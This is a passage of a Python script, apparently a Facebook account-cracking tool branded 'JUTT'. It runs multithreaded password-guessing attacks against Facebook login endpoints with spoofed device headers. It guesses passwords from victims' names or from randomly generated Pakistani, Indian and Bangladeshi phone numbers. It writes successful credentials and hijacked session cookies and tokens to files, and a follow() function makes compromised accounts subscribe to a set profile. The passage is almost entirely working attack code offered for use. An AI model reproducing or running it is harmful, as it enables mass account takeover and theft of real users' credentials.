                        f2.append(user + pw)
                        break
                    else:
                        print(f"\r\033[1;94m[CP-JUTT] {user} | {pw}  {samiya(user)} ")
                        open("/sdcard/JUTT_CP.txt", "a").write(user + "|" + pw + "\n")
                        cp.append(user + pw)
                        break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                time.sleep(5)
        self.loop += 1

    def __free__(self,user,__juts__,_jat):
        global ok,cp,f2,tl
        sys.stdout.write(f'\r{OO}[Crack] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
        sys.stdout.flush()
        for pw in __juts__:
            try:
                Mm = '\033[9;31m'
                ua_string=random.choice(ugen)
                application_version = str(random.randint(300,396))+'.0.0.'+str(random.randrange(10,49))+'.'+str(random.randint(111,396))
                application_version_code=str(random.randint(000000000,999999999))
                adid=str(uuid.uuid4())
                device=str(uuid.uuid4())
                machine=str(''.join(random.choice(string.ascii_uppercase+string.digits+string.ascii_lowercase) for _ in range(24)))
                android_version=str(random.randrange(5,13))
                sm=['GT-', 'SM-']
                uo=[2,3,4]
                b=str(random.choice(string.ascii_uppercase))
                gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                #ua_string = 'SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+gtt+' Build/'+gttt+') [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/'+application_version_code+';FBAV/'+application_version+';FBDV/'+gtt+';FBLC/vi_VN;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]'
                data = {
                    'locale':'en-US',
                    'client_country_code':'US',
                    'adid':adid,
                    'api_key':'882a8490361da98702bf97a021ddc14d',
                    'email':user,
                    'password':pw,
                    'community_id':'',
                    'secure_family_device_id':'',
                    'cpl':'true',
                    'currently_logged_in_userid':'0',
                    'device_id':device,
                    'fb_api_caller_class':'AuthOperations'+'$Password'+'AuthOperation',
                    'fb_api_req_friendly_name':'authenticate',
                    'format':'json',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1',
                    'generate_session_cookies':'1',
                    'jazoest':str(random.randint(2e4,4e4)),
                    'meta_inf_fbmeta':'NO_FILE',
                    'source':'login',
                    'try_num':'1',
                    'credentials_type':'password'
                }
                head={
                    'x-fb-connection-quality':'EXCELLENT',
                    'x-fb-connection-type':'MOBILE.LTE',
                    'user-agent':ua_string,
                    'x-tigon-is-retry':'False',
                    'x-fb-http-engine':'Liger',
                    'x-fb-client-ip':'True',
                    'x-fb-server-cluster':'True',
                    'x-fb-device-group':'5120',
                    'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                    'x-fb-net-hni':str(random.randint(2e4,4e4)),
                    'x-fb-rmd':'cached=0;state=NO_MATCH',
                    'x-fb-request-analytics-tags':'unknown',
                    'authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'content-type':'application/x-www-form-urlencoded',
                    'x-fb-friendly-name':'authenticate'
                }
                po=requests.post(_jat, data=data, headers=head, allow_redirects=False).text
                q = json.loads(po)
                if 'session_key' in str(q) or 'c_user' in str(q):
                    try:
                        used=str(q['uid'])
                        tokic=str(q['access_token'])
                    except:
                        used=user
                        tokic='lol'
                    if used in ok or used in tl:
                        break
                    coki = []
                    for x in q['session_cookies']:
                        coki.append(x['name']+'='+x['value']+';')
                    cokie = coki[3]+coki[2]+coki[0]+coki[1]
                    qcki = coki.split(";")[3] +";"+ coki.split(";")[4] +";"+ coki.split(";")[1]+";"+ coki.split(";")[0] +";"+ "dpr=2;locale=en_US;wd=1600x939;%s" %coki.split(";")[3].replace("c_user", "m_page_voice")
                    try:
                        me=requests.get('https://graph.facebook.com/me?access_token='+tokic, cookies={'cookie':cokie}).json()
                        name=me['name']
                        idd=me['id']
                        print(f"\r{HH}[OK-JUTT] {used} | {pw} {VV}    ")
                        open("/sdcard/JUTT_OK.txt", "a").write(used + "|" + pw + "\n")
                        open("/sdcard/JUTT_cokie.txt", "a").write(used + "|" + pw + " | " + qcki + "\n")
                        ok.append(used + pw)
                       # follow_id='100009823322549'
                      #  subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                        break
                    except KeyError:
                        print(f"\r\033[1;33m[TL-JUTT] {used} | {pw} {VV}    ")
                        tl.append(used + pw)
                        break
                elif "Login approvals are on" in str(q) or "two_factor" in str(q):
                    Mm = '\033[9;31m'
                    try:
                        used = str(q['error']['error_data']['uid'])
                    except:
                        try:
                            ds = str(q['error_data']).split(':')[2]
                            used = ds.split(',')[0]
                        except:
                            used=user
                    if len(used)<11 or len(used)>15:
                        used = user
                    print(f"\r{Mm}[2F-JUTT] {used} | {pw}{VV}     ")
                    open("/sdcard/JUTT_2F.txt", "a").write(used + "|" + pw + "\n")
                    f2.append(used + pw)
                    break
                elif 'User must verify their account' in str(q):
                    try:
                        used = str(q['error']['error_data']['uid'])
                    except:
                        try:
                            if 'cookie'+'='+'\\' in str(q):
                                used = str(q['error_data']).split('cookie'+'='+'\\')[1][32:47]
                            elif 'cookie'+'='+'%7B%22u%22%3A' in str(q):
                                used = str(q['error_data']).split('cookie'+'='+'%7B%22u%22%3A')[1][:15]
                            elif 'cookie'+'=' not in str(q):
                                used = user
                        except:
                            try:
                                if 'cookie'+'='+'\\' in str(q):
                                    used = str(q['error']['error_data']).split('cookie'+'='+'\\')[1][32:47]
                                elif 'cookie'+'='+'%7B%22u%22%3A' in str(q):
                                    used = str(q['error']['error_data']).split('cookie'+'='+'%7B%22u%22%3A')[1][:15]
                                elif 'cookie'+'=' not in str(q):
                                    used = user
                            except:
                                used=user
                    if len(used)<11 or len(used)>15:
                        used = user
                    if 'uid' not in str(q) or 'skip_ixt_start_dialog' in str(q):
                        Mm = '\033[9;31m'
                        print(f"\r{Mm}[2F-JUTT] {used} | {pw}{VV}     ")
                        open("/sdcard/JUTT_2F.txt", "a").write(used + "|" + pw + "\n")
                        f2.append(used + pw)
                        break
                    else:
                        print(f"\r{BB}[CP-JUTT] {used} | {pw} {VV}    ")
                        open("/sdcard/JUTT_CP.txt", "a").write(used + "|" + pw + "\n")
                        cp.append(used + pw)
                        break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                time.sleep(5)
        self.loop += 1

    def __mmb__(self,user,__juts__,_jat):
        global ok,cp,f2,tl
        sys.stdout.write(f'\r{OO}[Crack] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
        sys.stdout.flush()
        for pw in __juts__:
            try:
                application_version = str(random.randint(300,396))+'.0.0.'+str(random.randrange(10,49))+'.'+str(random.randint(111,396))
                application_version_code=str(random.randint(000000000,999999999))
                fbs=random.choice(fbks)
                android_version=str(random.randrange(5,13))
                sm=['GT-', 'SM-']
                uo=[2,3,4]
                b=str(random.choice(string.ascii_uppercase))
                gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                net=random.choice(['ZONG', 'Jazz'])
                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/366716093;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                device = str(uuid.uuid4())
                adid = str(uuid.uuid4())
                data = {
                    'adid':adid,
                    'format':'json',
                    'device_id':device,
                    'email':user,
                    'password':pw,
                    'generate_analytics_claim':'1',
                    'community_id':'',
                    'cpl':'true',
                    'try_num':'1',
                    'family_device_id':device,
                    'credentials_type':'password',
                    'enroll_misauth':'false',
                    'generate_session_cookies':'1',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'generate_machine_id':'1',
                    'jazoest':str(random.randint(2e4,4e4)),
                    'advertising_id':adid,
                    'meta_inf_fbmeta': 'NO_FILE',
                    'currently_logged_in_userid':'0',
                    'locale':'en_US',
                    'client_country_code':'US',
                    'fb_api_req_friendly_name':'authenticate',
                    'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key':'882a8490361da98702bf97a021ddc14d',
                    'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                }
                head={
                    'x-fb-connection-quality':'EXCELLENT',
                    'x-fb-connection-type':'MOBILE.LTE',
                    'user-agent':ua_string,
                    'x-tigon-is-retry':'False',
                    'x-fb-http-engine':'Liger',
                    'x-fb-client-ip':'True',
                    'x-fb-server-cluster':'True',
                    'x-fb-device-group':'5120',
                    'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                    'x-fb-net-hni':str(random.randint(2e4,4e4)),
                    'x-fb-rmd':'cached=0;state=NO_MATCH',
                    'x-fb-request-analytics-tags':'unknown',
                    'authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'content-type':'application/x-www-form-urlencoded',
                    'x-fb-friendly-name':'authenticate'
                }
                po = requests.post(_jat,data=data,headers=head).text
                q = json.loads(po)
                if 'session_key' in str(q) or 'c_user' in str(q):
                    try:
                        used=str(q['uid'])
                        tokic=str(q['access_token'])
                    except:
                        used=user
                        tokic='lol'
                    if used in ok or used in tl:
                        break
                    coki = []
                    for x in q['session_cookies']:
                        coki.append(x['name']+'='+x['value']+';')
                    cokie = coki[3]+coki[2]+coki[0]+coki[1]
                    qcki = coki.split(";")[3] +";"+ coki.split(";")[4] +";"+ coki.split(";")[1]+";"+ coki.split(";")[0] +";"+ "dpr=2;locale=en_US;wd=1600x939;%s" %coki.split(";")[3].replace("c_user", "m_page_voice")
                    try:
                        me=requests.get('https://graph.facebook.com/me?access_token='+tokic, cookies={'cookie':cokie}).json()
                        name=me['name']
                        idd=me['id']
                        print(f"\r{HH}[OK-JUTT] {used} | {pw} {VV}    ")
                        open("/sdcard/JUTT_OK.txt", "a").write(used + "|" + pw + "\n")
                        open("/sdcard/JUTT_cokie.txt", "a").write(used + "|" + pw + " | " + qcki + "\n")
                        ok.append(used + pw)
                       # follow_id='100009823322549'
                     #   subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                        break
                    except KeyError:
                        print(f"\r\033[1;33m[TL-JUTT] {used} | {pw} {VV}    ")
                        tl.append(used + pw)
                        break
                elif "Login approvals are on" in str(q) or "two_factor" in str(q):
                    Mm = '\033[9;31m'
                    try:
                        used = str(q['error']['error_data']['uid'])
                    except:
                        try:
                            ds = str(q['error_data']).split(':')[2]
                            used = ds.split(',')[0]
                        except:
                            used=user
                    if len(used)<11 or len(used)>15:
                        used = user
                    print(f"\r{Mm}[2F-JUTT] {used} | {pw}{VV}     ")
                    open("/sdcard/JUTT_2F.txt", "a").write(used + "|" + pw + "\n")
                    f2.append(used + pw)
                    break
                elif 'User must verify their account' in str(q):
                    try:
                        used = str(q['error']['error_data']['uid'])
                    except:
                        try:
                            if 'cookie'+'='+'\\' in str(q):
                                used = str(q['error_data']).split('cookie'+'='+'\\')[1][32:47]
                            elif 'cookie'+'='+'%7B%22u%22%3A' in str(q):
                                used = str(q['error_data']).split('cookie'+'='+'%7B%22u%22%3A')[1][:15]
                            elif 'cookie'+'=' not in str(q):
                                used = user
                        except:
                            try:
                                if 'cookie'+'='+'\\' in str(q):
                                    used = str(q['error']['error_data']).split('cookie'+'='+'\\')[1][32:47]
                                elif 'cookie'+'='+'%7B%22u%22%3A' in str(q):
                                    used = str(q['error']['error_data']).split('cookie'+'='+'%7B%22u%22%3A')[1][:15]
                                elif 'cookie'+'=' not in str(q):
                                    used = user
                            except:
                                used=user
                    if len(used)<11 or len(used)>15:
                        used = user
                    print(f"\r{BB}[CP-JUTT] {used} | {pw} {VV}    ")
                    open("/sdcard/JUTT_CP.txt", "a").write(used + "|" + pw + "\n")
                    cp.append(used + pw)
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                time.sleep(5)
        self.loop += 1

    def cek_cp(self,user,pw):
        global ok,cp,f2
        data = {}
        data2 = {}
        session = requests.Session()
        session.headers.update({'Host': 'mbasic.facebook.com', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
           'accept-encoding': 'gzip, deflate', 
           'accept-language': 'en-US,en;q=0.9', 
           'referer': 'https://mbasic.facebook.com/', 
           'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/239.0.0.10.109;]'})
        soup = BeautifulSoup(session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8').text, 'html.parser')
        for x in soup('input'):
            data.update({x.get('name'): x.get('value')})

        data.update({'email': user, 'pass': pw})
        urlPost = session.post('https://mbasic.facebook.com//login/device-based/regular/login/?refsrc=deprecated&ht_token=Abuoy_rVa4YbV3uUOG3LIulpRGEaork_ctTnh3PiOcI1VmTq&h_consent=1&ht_l=login&lwv=100&ref=dbl', data=data)
        cok = session.cookies.get_dict()
        if "c_user" in str(cok):
        	#qcki = coki.split(";")[3] +";"+ coki.split(";")[4] +";"+ coki.split(";")[1]+";"+ coki.split(";")[0] +";"+ "dpr=2;locale=en_US;wd=1600x939;%s" %coki.split(";")[3].replace("c_user", "m_page_voice")
            qcki = coki.split(";")[3] +";"+ coki.split(";")[4] +";"+ coki.split(";")[1]+";"+ coki.split(";")[0] +";"+ "dpr=2;locale=en_US;wd=1600x939;%s" %coki.split(";")[3].replace("c_user", "m_page_voice")
            print(f"\r{HH}[OK-JUTT] {user} | {pw} {VV}    ")
            open("/sdcard/JUTT_OK.txt", "a").write(user + "|" + pw + "\n")
            ok.append(user + pw)
        elif 'Enter login code to continue' in urlPost.text:
            Mm = '\033[9;31m'
            print(f"\r{Mm}[2F-JUTT] {user} | {pw}{VV}     ")
            open("/sdcard/JUTT_2F.txt", "a").write(user + "|" + pw + "\n")
            f2.append(user + pw)
        else:
            print(f"\r{BB}[CP-JUTT] {user} | {pw} {VV}    ")
            open("/sdcard/JUTT_CP.txt", "a").write(user + "|" + pw + "\n")
            cp.append(user + pw)

    def follow(self,coki):
        session = requests.Session()
        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100009823322549",cookies={"cookie":coki}).text,"html.parser")
        for x in r.find_all("a",href=True):
            if "/a/subscribe.php" in x.get('href'):
                session.get('https://mbasic.facebook.com'+x.get('href'), cookies={'cookie':coki}).text
        #if '/a/subscribe.php' in str(r):
            #b=str(r).split('/a/subscribe.php')[1].split('">')[0].replace('&amp;', '&')
            #session.get("https://mbasic.facebook.com/a/subscribe.php"+str(b), cookies={"cookie":coki}).text
        #else:
            #pass

    def __pler_(self):
        os.system('clear')
        print (logo4)
        motd.clear()
        print ('\033[1;33m~~~~~~~~~~Method Menu~~~~~~~~~~\033[0;97m')
        print (47*'-')
        print ('\033[1;32m[1] Method 1')
        print ('\033[1;32m[2] Method 2')
        print ('\033[1;32m[3] Method 3')
        print (47*'-')
        vz = input('\033[1;36mSelect: \033[0;97m')
        if vz in ['1', '2', '3']:
            print (47*'-')
            print ('\033[1;32m[1] Crack (Fast)')
            print ('\033[1;32m[2] Crack (Slow)')
            motd.append('file')
            print ('\033[1;32m[3] Crack (super slow)\033[0;97m')
            uz = input('\033[1;36mSelect: \033[0;97m')
            time.sleep(0.5)
            print (47*'-')
            print ('\033[1;33m~Use Flight Mode 5 Second After Every 10 mint~\033[0;97m')
            print (47*'-')
            time.sleep(0.5)
            print (self.apk)
            time.sleep(0.5)
            print (' \x1b[1;97mCrack Running\x1b[1;97m ')
            time.sleep(0.5)
            print (47*'-')
            print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
            time.sleep(0.5)
            print (47*'-')
            with JuttBadshah(max_workers=30) as (__juttbrand__):
                for juttxd in self.id:
                    try:
                        uid, name = juttxd.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            hf = self.ggs.replace("First", xz[0]).replace("first", xz[0].lower()).replace("Last", xz[1]).replace("last", xz[1].lower()).replace("Name", name).replace("name", name.lower()).splitlines()
                        else:
                            hf = self.ggs.replace("First", xz[0]).replace("first", xz[0].lower()).replace("Last", xz[1]).replace("last", xz[1].lower()).replace("Name", name).replace("name", name.lower()).splitlines()
                        pwx = hf
                        url1 = 'https://b-graph.facebook.com/auth/login'
                        url2 = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                        url3 = 'https://b-api.facebook.com/method/auth.login'
                        if vz == '1' and uz == '1':
                            __juttbrand__.submit(self.__mbasic__,uid,pwx,"free.facebook.com")
                        elif vz == '1' and uz == '2':
                            __juttbrand__.submit(self.__mbasic__,uid,pwx,"p.facebook.com")
                        elif vz == '1' and uz == '3':
                            __juttbrand__.submit(self.__mbasic__,uid,pwx,"x.facebook.com")
                        elif vz == '2' and uz == '1':
                            __juttbrand__.submit(self.__free__,uid,pwx,url1)
                        elif vz == '2' and uz == '2':
                            __juttbrand__.submit(self.__free__,uid,pwx,url2)
                        elif vz == '2' and uz == '3':
                            __juttbrand__.submit(self.__free__,uid,pwx,url1)
                        elif vz == '3' and uz == '1':
                            __juttbrand__.submit(self.__mmb__,uid,pwx,url1)
                        elif vz == '3' and uz == '2':
                            __juttbrand__.submit(self.__mmb__,uid,pwx,url2)
                        elif vz == '3' and uz == '3':
                            __juttbrand__.submit(self.__mmb__,uid,pwx,url1)
                        else:
                            __juttbrand__.submit(self.__mbasic__,uid,pwx,'p.facebook.com')
                    except:
                        pass

            hasil(ok,f2,cp)
        else:
            print ('\033[0;97mSelect Valid Option')
            time.sleep(3)
            self.__pler_()

    def __random__(self):
        os.system('clear')
        print (logo4)
        print ('\033[1;32m[1] Pakistan ids Clone')
        print ('\033[1;32m[2] indian ids Clone')
        print ('\033[1;32m[3] bangladesh ids clone')
        print ('\033[1;32m[0] Back\033[0;97m')
        print (47*'-')
        tg = input('\033[1;36mSelect: \033[0;97m')
        if tg == '1':
            os.system('clear')
            print (logo4)
            print ('\033[1;33mEnter Pakistani Number Code\033[0;97m')
            print ('\033[1;33mExample 0300,0301,0312,0345,etc,,,\033[0;97m')
            print (47*'-')
            os.system('rm -rf .num.txt')
            k = input('\033[1;36mEnter Code: \033[0;97m')
            print ('\033[1;33mExample 1000,2000,3000,4000,5000\033[0;97m')
            try:
                cb = int(input('\033[1;33mNumbers Limit: \033[0;97m'))
            except:
                cb = 5000
            for x in range(cb):
                nmbr = ''.join(random.choice(string.digits) for _ in range(7))
                open('.num.txt', 'a').write(nmbr + '|' + '\n')
            self.id = open('.num.txt', 'r').read().splitlines()
            print (47*'-')
            print ('\033[1;32m[1]Auto Password')
            print ('\033[1;32m[2]Choice Password\033[0;97m')
            pas=input('\033[0;97mSelect: ')
            if pas == '1':
                pwz=['number', 'fullnumber', 'khankhan', 'baloch']
                pwzz = '\n'.join(pwz)
                pwzzz = (pwzz + '\n')
            elif pas == '2':
                print ('\033[1;33mHow Many Password You Want To Add?')
                try:
                    jdg = int(input('\033[1;32mSelect Between 1 To 100: \033[0;97m'))
                except:
                    jdg = 1
                y = 0
                chsss = []
                print (47*'-')
                print ('\033[1;33mExample: number, fullnumber, khankhan, baloch\033[0;97m')
                print (47*'-')
                for y in range(jdg):
                    y += 1
                    pass1 = input('\033[1;32mPassword %s: \033[0;97m'%(y))
                    chsss.append(pass1)
                helo = '\n'.join(chsss)
                pwzzz = (helo + '\n')
                chsss.clear()
                print (47*'-')
            else:
                pwz=['number', 'fullnumber', 'khankhan', 'baloch']
                pwzz = '\n'.join(pwz)
                pwzzz = (pwzz + '\n')
            print ('\033[1;33m~~~~~~~~~~Method Menu~~~~~~~~~~\033[0;97m')
            print (47*'-')
            print ('\033[1;32m[1] Method 1')
            print ('\033[1;32m[2] Method 2')
            print ('\033[1;32m[3] Method 3')
            print (47*'-')
            vz = input('\033[1;36mSelect: \033[0;97m')
            if vz in ['1', '2', '3']:
                print (47*'-')
                print ('\033[1;32m[1] Crack (Fast)')
                print ('\033[1;32m[2] Crack (Slow)')
                print ('\033[1;32m[3] Crack (super slow)\033[0;97m')
                uz = input('\033[1;36mSelect: \033[0;97m')
                motd.append('random')
                time.sleep(0.5)
                print (' \x1b[1;97mCrack Running\x1b[1;97m ')
                time.sleep(0.5)
                print (47*'-')
                print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
                time.sleep(0.5)
                print (47*'-')
                with JuttBadshah(max_workers=30) as (__juttbrand__):
                    for juttxd in self.id:
                        try:
                            juid = juttxd.split('|')[0]
                            uid = k+juid
                            pwx = pwzzz.replace('number', juid).replace('full', k).splitlines()
                            url1 = 'https://b-graph.facebook.com/auth/login'
                            url2 = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                            url3 = 'https://b-api.facebook.com/method/auth.login'
                            if vz == '1' and uz == '1':
                                __juttbrand__.submit(self.__randoms__,uid,pwx,"p.facebook.com")
                            elif vz == '1' and uz == '2':
                                __juttbrand__.submit(self.__randoms__,uid,pwx,"x.facebook.com")
                            elif vz == '1' and uz == '3':
                                __juttbrand__.submit(self.__randoms__,uid,pwx,"free.facebook.com")
                            elif vz == '2' and uz == '1':
                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
                            elif vz == '2' and uz == '2':
                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
                            elif vz == '2' and uz == '3':
                                __juttbrand__.submit(self.__free__,uid,pwx,url3)
                            elif vz == '3' and uz == '1':
                                __juttbrand__.submit(self.__mmb__,uid,pwx,url1)
                            elif vz == '3' and uz == '2':
                                __juttbrand__.submit(self.__mmb__,uid,pwx,url2)
                            elif vz == '3' and uz == '3':
                                __juttbrand__.submit(self.__mmb__,uid,pwx,url3)
                            else:
                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
                        except:
                            pass

            hasil(ok,f2,cp)
        elif tg == '2':
            os.system('clear')
            print (logo4)
            print ('\033[1;33mEnter Code 3 Digit indian Code\033[0;97m')
            print (47*'-')
            print ('\033[1;33mExample 766,941,981,962,809,745,etc.\033[0;97m')
            print (47*'-')
            os.system('rm -rf .num.txt')
            k = '91'
            c = input('\033[1;36mEnter Code: \033[0;97m')
            print ('\033[1;33mExample 1000,2000,3000,4000,5000\033[0;97m')
            try:
                cb = int(input('\033[1;33mNumbers Limit: \033[0;97m'))
            except:
                cb = 5000
            for x in range(cb):
                nmbr = ''.join(random.choice(string.digits) for _ in range(7))
                open('.num.txt', 'a').write(nmbr + '|' + '\n')
            self.id = open('.num.txt', 'r').read().splitlines()
            os.system('rm -rf .num.txt')
            print (47*'-')
            print ('\033[1;32m[1]Auto Password')
            print ('\033[1;32m[2]Choice Password\033[0;97m')
            pas=input('\033[0;97mSelect: ')
            if pas == '1':
                pwz=['number']
                pwzz = '\n'.join(pwz)
                pwzzz = (pwzz + '\n')
            elif pas == '2':
                print ('\033[1;33mHow Many Password You Want To Add?')
                try:
                    jdg = int(input('\033[1;32mSelect Between 1 To 100: \033[0;97m'))
                except:
                    jdg = 1
                y = 0
                chsss = []
                print (47*'-')
                print ('\033[1;33mExample: number, india123, khankhan\033[0;97m')
                print (47*'-')
                for y in range(jdg):
                    y += 1
                    pass1 = input('\033[1;32mPassword %s: \033[0;97m'%(y))
                    chsss.append(pass1)
                helo = '\n'.join(chsss)
                pwzzz = (helo + '\n')
                chsss.clear()
                print (47*'-')
            else:
                pwz=['number']
                pwzz = '\n'.join(pwz)
                pwzzz = (pwzz + '\n')
            print ('\033[1;33m~~~~~~~~~~Method Menu~~~~~~~~~~\033[0;97m')
            print (47*'-')
            print ('\033[1;32m[1] Method 1')
            print ('\033[1;32m[2] Method 2')
            print ('\033[1;32m[3] Method 3')
            print (47*'-')
            vz = input('\033[1;36mSelect: \033[0;97m')
            if vz in ['1', '2', '3']:
                print (47*'-')
                print ('\033[1;32m[1] Crack (Fast)')
                print ('\033[1;32m[2] Crack (Slow)')
                print ('\033[1;32m[3] Crack (super slow)\033[0;97m')
                uz = input('\033[1;36mSelect: \033[0;97m')
                motd.append('random')
                time.sleep(0.5)
                print (' \x1b[1;97mCrack Running\x1b[1;97m ')
                time.sleep(0.5)
                print (47*'-')
                print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
                time.sleep(0.5)
                print (47*'-')
                with JuttBadshah(max_workers=30) as (__juttbrand__):
                    for juttxd in self.id:
                        try:
                            juid = juttxd.split('|')[0]
                            uid = k+c+juid
                            pwx = pwzzz.replace('number', c+juid).splitlines()
                            url1 = 'https://b-graph.facebook.com/auth/login'
                            url2 = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                            url3 = 'https://b-api.facebook.com/method/auth.login'
                            if vz == '1' and uz == '1':
                                __juttbrand__.submit(self.__randoms__,uid,pwx,"p.facebook.com")
                            elif vz == '1' and uz == '2':
                                __juttbrand__.submit(self.__randoms__,uid,pwx,"x.facebook.com")
                            elif vz == '1' and uz == '3':
                                __juttbrand__.submit(self.__randoms__,uid,pwx,"free.facebook.com")
                            elif vz == '2' and uz == '1':
                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
                            elif vz == '2' and uz == '2':
                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
                            elif vz == '2' and uz == '3':
                                __juttbrand__.submit(self.__free__,uid,pwx,url3)
                            elif vz == '3' and uz == '1':
                                __juttbrand__.submit(self.__mmb__,uid,pwx,url1)
                            elif vz == '3' and uz == '2':
                                __juttbrand__.submit(self.__mmb__,uid,pwx,url2)
                            elif vz == '3' and uz == '3':
                                __juttbrand__.submit(self.__mmb__,uid,pwx,url3)
                            else:
                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
                        except:
                            pass

            hasil(ok,f2,cp)
        elif tg == '3':
            os.system('clear')
            print (logo4)
            print ('\033[1;33mEnter Code 3 Digit bd Code\033[0;97m')
            print (47*'-')
            print ('\033[1;33mExample 016, 017, 018, 019 ,etc.\033[0;97m')
            print (47*'-')
            os.system('rm -rf .num.txt')
            k = '88'
            c = input('\033[1;36mEnter Code: \033[0;97m')
            print ('\033[1;33mExample 1000,2000,3000,4000,5000,10000\033[0;97m')
            try:
                cb = int(input('\033[1;33mNumbers Limit: \033[0;97m'))
            except:
                cb = 5000
            for x in range(cb):
                nmbr = ''.join(random.choice(string.digits) for _ in range(8))
                open('.num.txt', 'a').write(nmbr + '|' + '\n')
            self.id = open('.num.txt', 'r').read().splitlines()
            os.system('rm -rf .num.txt')
            print (47*'-')
            print ('\033[1;32m[1]Auto Password')
            print ('\033[1;32m[2]Choice Password\033[0;97m')
            pas=input('\033[0;97mSelect: ')
            if pas == '1':
                pwz=['number', 'fullnumber', 'Bangladesh', 'bangladesh']
                pwzz = '\n'.join(pwz)
                pwzzz = (pwzz + '\n')
            elif pas == '2':
                print ('\033[1;33mHow Many Password You Want To Add?')
                try:
                    jdg = int(input('\033[1;32mSelect Between 1 To 100: \033[0;97m'))
                except:
                    jdg = 1
                y = 0
                chsss = []
                print (47*'-')
                print ('\033[1;33mExample: number, fullnumber, Bangladesh, bangladesh\033[0;97m')
                print (47*'-')
                for y in range(jdg):
                    y += 1
                    pass1 = input('\033[1;32mPassword %s: \033[0;97m'%(y))
                    chsss.append(pass1)
                helo = '\n'.join(chsss)
                pwzzz = (helo + '\n')
                chsss.clear()
                print (47*'-')
            else:
                pwz=['number', 'fullnumber', 'Bangladesh', 'bangladesh']
                pwzz = '\n'.join(pwz)
                pwzzz = (pwzz + '\n')
            print ('\033[1;33m~~~~~~~~~~Method Menu~~~~~~~~~~\033[0;97m')
            print (47*'-')
            print ('\033[1;32m[1] Method 1')
            print ('\033[1;32m[2] Method 2')
            print ('\033[1;32m[3] Method 3')
            print (47*'-')
            vz = input('\033[1;36mSelect: \033[0;97m')
            if vz in ['1', '2', '3']:
                print (47*'-')
                print ('\033[1;32m[1] Crack (Fast)')
                print ('\033[1;32m[2] Crack (Slow)')
                print ('\033[1;32m[3] Crack (super slow)\033[0;97m')
                uz = input('\033[1;36mSelect: \033[0;97m')
                motd.append('random')
                time.sleep(0.5)
                print (' \x1b[1;97mCrack Running\x1b[1;97m ')
                time.sleep(0.5)
                print (47*'-')
                print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
                time.sleep(0.5)
                print (47*'-')
                with JuttBadshah(max_workers=30) as (__juttbrand__):
                    for juttxd in self.id:
                        try:
                            juid = juttxd.split('|')[0]
                            uid = k+c+juid
                            pwx = pwzzz.replace('number', juid).replace('full', c).splitlines()
                            url1 = 'https://b-graph.facebook.com/auth/login'
                            url2 = 'https://b-graph.facebook.com/auth/login'
                            url3 = 'https://b-api.facebook.com/method/auth.login'
                            if vz == '1' and uz == '1':
                                __juttbrand__.submit(self.__randoms__,uid,pwx,"p.facebook.com")
                            elif vz == '1' and uz == '2':
